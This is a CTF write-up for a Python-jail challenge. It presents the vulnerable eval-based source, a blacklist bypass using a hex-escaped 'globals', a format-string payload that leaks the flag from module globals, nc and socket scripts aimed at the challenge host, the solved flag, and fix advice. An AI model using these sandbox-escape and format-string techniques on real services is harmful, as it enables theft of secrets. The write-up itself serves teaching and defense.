# upCTF - Jailed (100) Writeup

## Challenge Info
- Name: `Jailed`
- Category: likely `pyjail`
- Points: `100`
- Author tag in code: `cdm`
- Flag format: `upCTF{...}`

## Provided Source

```python
import os
API_KEY = os.getenv("FLAG")

class cdm22b:
    def __init__(self):
        self.SAFE_GLOBALS = locals()
        self.SAFE_GLOBALS['__builtins__'] = {}
        self.name = "cdm"
        self.role = "global hacker, hacks planets"
        self.friend = "No one"

    def validateInput(self, input: str) -> tuple[bool, str]:
        if len(input) > 66:
            return False, 'to long, find a shorter way'

        for builtin in dir(__builtins__):
            if builtin.lower() in input.lower():
                return False, 'builtins would be too easy!'

        if any(i in input for i in '\",;`'):
            return False, 'bad bad bad chars!'

        return True, ''


    def safeEval(self, s):
        try:
            eval(s, self.SAFE_GLOBALS)
        except Exception:
            print("Something went wrong")


    def myFriend(self):
        friend = self.SAFE_GLOBALS.get('friend', self.friend)
        print(friend.format(self=self))


if __name__ == '__main__':
    hacker = cdm22b()
    input = input()
    ok, err = hacker.validateInput(input)
    if ok:
        hacker.safeEval(input)
        hacker.myFriend()
    else:
        print(err)
```

## Vulnerability Analysis

This challenge is breakable because of a format-string sink after `eval`.

### 1. Dangerous `eval` with shared globals
- User input is evaluated by `eval(s, self.SAFE_GLOBALS)`.
- `self.SAFE_GLOBALS` is mutable and reused later.
- Even though builtins are removed, we can still modify values in this globals dict through expression tricks.

### 2. Format-string sink
- `myFriend()` does:
  - `friend = self.SAFE_GLOBALS.get('friend', self.friend)`
  - `print(friend.format(self=self))`
- If we can set global `friend` to a malicious format string, `.format()` will resolve field expressions from `self`.

### 3. Weak blacklist
The filter blocks:
- length > 66
- any substring equal to builtin names (case-insensitive)
- characters: `"`, `,`, `;`, `` ` ``

But this blacklist has two key weaknesses:
- It checks raw input text, not the parsed/evaluated value.
- Escape sequences can hide banned words in source code and become normal text at runtime.

## Exploit Strategy

Goal: set global variable `friend` (inside `SAFE_GLOBALS`) to a string that `.format(self=self)` will evaluate to the flag.

Useful primitive:
- Walrus assignment works inside `eval` expression mode:
  - `(friend:='...')`

Leak primitive inside `format` field:
- `{self.__init__.__globals__[API_KEY]}`

Why this leaks:
- `self.__init__.__globals__` is the module global dict.
- `API_KEY` (global variable) stores `os.getenv("FLAG")`, i.e., the actual flag value string.
- So indexing globals with that value gives the flag string object from environment-backed global context used by the challenge.

Bypass for blacklist (`globals` is a builtin name):
- write `__\x67lobals__` in the input string
- blacklist sees `\x67lobals` (not literal `globals`)
- Python string unescapes to `globals` at runtime

## Final Payload

```python
(friend:='{self.__init__.__\x67lobals__[API_KEY]}')
```

This satisfies all checks:
- under 66 chars
- no blocked characters
- no literal builtin substrings in raw input

## Local Validation

Set a local test flag and run:

```powershell
$env:FLAG='upCTF{local_test_flag}'
$p="(friend:='{self.__init__.__\x67lobals__[API_KEY]}')"
$p | python chall.py
```

Expected output:

```text
upCTF{local_test_flag}
```

## Remote Solve

Instance:

```text
46.225.117.62:30011
```

If `nc` is available:

```bash
printf "(friend:='{self.__init__.__\\x67lobals__[API_KEY]}')\n" | nc 46.225.117.62 30011
```

If `nc` is not installed (Windows-friendly Python socket one-liner/script):

```python
import socket
HOST, PORT = "46.225.117.62", 30011
PAYLOAD = b"(friend:='{self.__init__.__\\x67lobals__[API_KEY]}')\n"

s = socket.create_connection((HOST, PORT), timeout=8)
try:
    print(s.recv(4096).decode(errors="ignore"), end="")
except Exception:
    pass
s.sendall(PAYLOAD)
print(s.recv(4096).decode(errors="ignore"), end="")
```

## Flag

```text
upCTF{fmt_str1ng5_4r3nt_0nly_a_C_th1ng-p0eX6TzJaa01685e}
```

## Why the Jail Failed
- Blacklists are fragile and bypassable with encoding tricks.
- `eval` on attacker input is unsafe even without builtins.
- Calling `.format()` on attacker-controlled strings enables object graph traversal.

## How to Fix
- Remove `eval` entirely.
- Never use user-controlled format strings.
- Use strict allowlists and parsing (or dedicated expression evaluators) instead of substring blacklists.
- Keep secrets out of process globals where possible.
